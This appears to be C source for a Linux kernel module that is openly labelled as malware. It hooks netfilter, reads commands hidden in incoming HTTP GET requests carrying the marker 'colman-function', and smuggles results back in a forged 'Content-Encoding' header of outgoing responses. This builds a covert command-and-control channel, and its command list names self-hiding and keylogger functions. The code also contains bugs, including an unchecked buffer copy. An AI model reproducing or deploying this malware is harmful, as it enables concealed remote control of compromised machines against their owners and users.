#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/version.h>
#include <net/ip.h>


#include "cnc.h"


#define MALWARE_FUNC "colman-function"

void * find_malware_struct(void * address, char * string);

struct nf_hook_ops http_hook_out;
struct nf_hook_ops http_hook_in;


unsigned int http_callback( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *));
void set_result_msg(char * result_msg, size_t msg_len);

typedef enum {
	TEST = 0,
	SELF_HIDE,
	KEYLOGGER
}COMMANDS;



#define MAX_HTTP_HEADER_LEN 2048
#define MAX_HTTP_DATA_LEN 1024
#define MINIMUM_CNC_DATA 170-24
#define MAX_COMMAND_LEN 100
#define MAX_RESULT_LEN 100
#define GET 0x20544547
#define HTTP_OK 0x50545448
#define RESULT_HEADER_STR "Content-Encoding: "

#define TOT_HDR_LEN 28

typedef struct _result_msg{
	char * msg;
	int len;
}result_msg;

result_msg * global_result_msg = NULL;


void set_result_msg(char * result_msg, size_t msg_len)
{
	if (global_result_msg == NULL)
	{
		global_result_msg = kmalloc(sizeof(result_msg), GFP_KERNEL);
	}
	else
	{
		kfree(global_result_msg->msg);
	}
	global_result_msg->msg = (char *)kmalloc(sizeof(char) * msg_len, GFP_KERNEL);
	global_result_msg->len = msg_len;
	memcpy(global_result_msg->msg, result_msg, msg_len);
}

unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
{
	struct ethhdr *ethh = NULL;
	struct iphdr *iph = NULL;
	struct tcphdr *tcph = NULL;
	u32 *httph = NULL;
	int tcp_src_port;
	int tcp_data_len=0;
	unsigned char *tcp_data = NULL;
	char * tcp_new_data;
	int offset = 0, len = 0;
  	char result_header[] = RESULT_HEADER_STR;
  	char result_header_end[] = "\r\n";
  	char* ptr;
	int result_msg_len;

	iph = ip_hdr(pskb);
	if (NULL == iph) {
		return NF_ACCEPT;
	}
	if (IPPROTO_TCP != iph->protocol) { // Not TCP
		return NF_ACCEPT;
	}

	tcph = (struct tcphdr *)((char *)iph + (iph->ihl << 2));
	if (NULL == tcph) {
		return NF_ACCEPT;
	}

	tcp_src_port = ntohs(tcph->source);

	if (80 != tcp_src_port) {
		return NF_ACCEPT;
	}


	if (!tcph->psh) { // TCP three-way handshake
		return NF_ACCEPT;
	}
	tcp_data_len = iph->tot_len - (iph->ihl << 2) - (tcph->doff << 2);
	tcp_data = (unsigned char *)(pskb->data + (iph->ihl << 2) + (tcph->doff << 2));

	httph = (u32 *)tcp_data;
	
	if (*httph != HTTP_OK) { // Not GET
		return NF_ACCEPT;
	}

	printk("saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
	printk("HTTP GET DETECTED -> CHANGE PACKET\n");
	printk("space left: %d\n", skb_tailroom(pskb));

    printk("data_len: %d\n", ntohs(iph->tot_len));

    printk("new data_len: %d\n", ntohs(htons(2 + ntohs(iph->tot_len))));

	if (unlikely(skb_linearize(pskb) != 0))
	{
		printk("[+] not linear\n");
		return NF_ACCEPT;
	}

  	result_msg_len =  strlen(result_header) + strlen(result_header_end) + global_result_msg->len;
	printk("len: %d\n", result_msg_len);


  	ptr = (char*) skb_put(pskb, result_msg_len); 

  	memcpy(ptr, result_header, strlen(result_header));

  	memcpy(ptr + strlen(result_header), global_result_msg->msg, global_result_msg->len);

  	memcpy(ptr + strlen(result_header) + global_result_msg->len, result_header_end, strlen(result_header_end));

    
    /* Manipulating necessary header fields */
    iph->tot_len = htons(result_msg_len + ntohs(iph->tot_len));
    printk("new tot len 0x%x\n", iph->tot_len);
    //tcph->len = htons(tot_data_len + TCP_HDR_LEN);

    /* Calculation of IP header checksum */
    iph->check = 0;
    ip_send_check (iph);

    // /* Calculation of TCP checksum */
    tcph->check = 0;
    offset = skb_transport_offset(pskb);
    len = pskb->len - offset;
    tcph->check = ~csum_tcpudp_magic((iph->saddr), (iph->daddr), len, IPPROTO_TCP, 0);

	printk("saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
	printk("HTTP GET DETECTED -> CHANGE PACKET\n");
	
	return NF_ACCEPT;
}


unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
{
	struct ethhdr *ethh = NULL;
	struct iphdr *iph = NULL;
	struct tcphdr *tcph = NULL;
	u32 *httph = NULL;
	int tcp_dst_port;
	int tcp_data_len=0;
	unsigned char *tcp_data = NULL;
	char command[MAX_COMMAND_LEN];
	int i = 0, index = 0;
	long command_num = 1;

	iph = ip_hdr(pskb);
	if (NULL == iph) {
		return NF_ACCEPT;
	}
	if (IPPROTO_TCP != iph->protocol) { // Not TCP
		return NF_ACCEPT;
	}

	tcph = (struct tcphdr *)((char *)iph + (iph->ihl << 2));
	if (NULL == tcph) {
		return NF_ACCEPT;
	}

	tcp_dst_port = ntohs(tcph->dest);


	if (80 != tcp_dst_port) {
		return NF_ACCEPT;
	}


	if (!tcph->psh) { // TCP three-way handshake
		return NF_ACCEPT;
	}
	tcp_data_len = iph->tot_len - (iph->ihl << 2) - (tcph->doff << 2);
	tcp_data = (unsigned char *)(pskb->data + (iph->ihl << 2) + (tcph->doff << 2));

	if (tcp_data_len <= MINIMUM_CNC_DATA + strlen(MALWARE_FUNC)) {
		return NF_ACCEPT;
	}
	
	httph = (u32 *)tcp_data;
	
	if (*httph != GET ) { // Not GET
		return NF_ACCEPT;
	}
	printk("HTTP GET DETECTED -> EXEC COMMANDS\n");
	printk("saddr = %d.%d.%d.%d:\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));

	index = find_malware_struct(tcp_data, MALWARE_FUNC);
	if (!index)
	{
		return NF_ACCEPT;
	}

	for (i = 2 ; tcp_data[index + strlen(MALWARE_FUNC) + i] != 0xd && i <= MAX_COMMAND_LEN; i++)
	{
		command[i-2] = tcp_data[index + strlen(MALWARE_FUNC) + i];
	}
	command[i-2] = 0x0;

	//printk("command = %s (len %d)\n", command, i-2);

	
	//uintmax_t command_num = strtoumax(command, NULL, 10);
	if (kstrtol(command, 10, &command_num) != 0)
	{
    	printk("[-] Invlid command.\n");
		return NF_ACCEPT;
	}

	switch ((COMMANDS)command_num) {
		case TEST :
			set_result_msg("Test OK", strlen("Test OK"));
			printk("OK\n");
			break;

		default:
			set_result_msg("Invalid command", strlen("Invalid command"));
			printk("Invalid command\n");
			break;
	}
	return NF_ACCEPT;
}

void * find_malware_struct(void * address, char * string)
{
	void *result = strstr((char *)address, string);
	if (result == NULL)
		return NULL;
	return (result - address);
}

void set_http_callback( void )
{


	set_result_msg("Init", strlen("Init"));
	http_hook_in.hook = (void *)http_callback_get_command;
	http_hook_in.hooknum = NF_INET_PRE_ROUTING;
	http_hook_in.pf = PF_INET;
	http_hook_in.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_register_net_hook(&init_net, &http_hook_in);
#else
	nf_register_hook(&http_hook_in);
#endif


	http_hook_out.hook = (void *)http_callback_result;
	http_hook_out.hooknum = NF_INET_POST_ROUTING;
	http_hook_out.pf = PF_INET;
	http_hook_out.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_register_net_hook(&init_net, &http_hook_out);
#else
	nf_register_hook(&http_hook_out);
#endif

}


void unset_http_callback ( void )
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	nf_unregister_net_hook(&init_net, &http_hook_in);
#else
	nf_unregister_hook(&http_hook_in);
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	nf_unregister_net_hook(&init_net, &http_hook_out);
#else
	nf_unregister_hook(&http_hook_out);
#endif

	kfree(global_result_msg->msg);
	kfree(global_result_msg);
}

